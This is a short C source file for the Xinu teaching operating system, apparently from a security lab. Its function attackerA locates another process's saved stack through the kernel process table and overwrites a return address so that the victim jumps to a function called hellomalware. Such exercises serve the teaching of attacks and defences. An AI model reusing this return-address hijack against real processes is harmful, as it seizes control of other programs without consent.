/* attackerA.c - attackerA */

#include <xinu.h>

/*--------------------------------------------------------
 * attackerA - attacks a process and kills it
 *--------------------------------------------------------
 */
void attackerA(
    int y /* The number of pids to decrement from currpid */
    )
{
  pid32 victimpid;
  int i;
  struct procent *prptr;
  long *saddr;

  /* Obtain the victim ID */
  victimpid  = getpid() - y;

  if (isbadpid(victimpid)) {
    return;
  }

  /* Get the victims stkptr */
  prptr = &proctab[victimpid];
  saddr = (long *) (prptr->prstkptr);

  /* Increment saddr until you get to the return address */
  for (i = 0; i < 10; i++)
    ;

  /* Overwrite the return address to the malware attack */
  *(saddr + i) = (long) hellomalware;
}

